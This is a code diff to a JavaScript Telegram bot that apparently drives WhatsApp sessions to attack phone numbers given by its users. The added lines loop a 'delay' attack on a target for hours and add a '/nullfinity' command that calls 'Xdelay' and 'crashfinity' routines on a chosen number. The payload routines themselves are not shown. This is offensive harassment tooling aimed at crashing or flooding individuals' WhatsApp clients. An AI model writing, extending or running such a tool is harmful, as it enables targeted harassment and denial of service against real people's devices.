@@ -837,7 +837,49 @@ function startSYloveBot(token) {
                     if (!count || count <= 0) return S7.sendMessage(chatId, '❌ Invalid count');
                     for (let i = 0; i < count; i++) {
                         await XLogic.Xdelay(client, targetJid);
-                        await CrashLogic.crashfinity(client, targetJid);
+                        await delayFn(500);
+                    }
+                } else {
+                    const hours = parseInt(args[2]);
+                    if (!hours || hours <= 0) return S7.sendMessage(chatId, '❌ Invalid time');
+                    const endTime = Date.now() + hours * 60 * 60 * 1000;
+                    while (Date.now() < endTime) {
+                        await XLogic.Xdelay(client, targetJid);
+                        await delayFn(500);
+                    }
+                }
+            } catch (err) {
+                log('error', 'delayxceed', err.message);
+                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
+            }
+        });
+
+        SYLoVe('nullfinity', async (msg) => {
+            const chatId = msg.chat.id.toString();
+            const userId = msg.from.id.toString();
+            const args = msg.text.split(' ');
+            const targetNum = args[1];
+
+            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
+
+            const session = GetSessionForUser(userId, chatId);
+            if (session.error) return S7.sendMessage(chatId, session.error);
+            const client = session.sock;
+
+            if (!targetNum) return S7.sendMessage(chatId, `❌ Usage: /nullfinity +92020065715`);
+
+            const cleanTarget = targetNum.replace(/[^0-9]/g, '');
+            const targetJid = `${cleanTarget}@s.whatsapp.net`;
+
+            try {
+                const [exists] = await client.onWhatsApp(targetJid);
+                if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
+
+                log('command', msg.from.first_name, `Calling nullfinity on ${cleanTarget}`);
+                await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });
+
+                await XLogic.Xdelay(client, targetJid);
+                await CrashLogic.crashfinity(client, targetJid);
             } catch (err) {
                 log('error', 'nullfinity', err.message);
                 S7.sendMessage(chatId, `❌ Error: ${err.message}`);
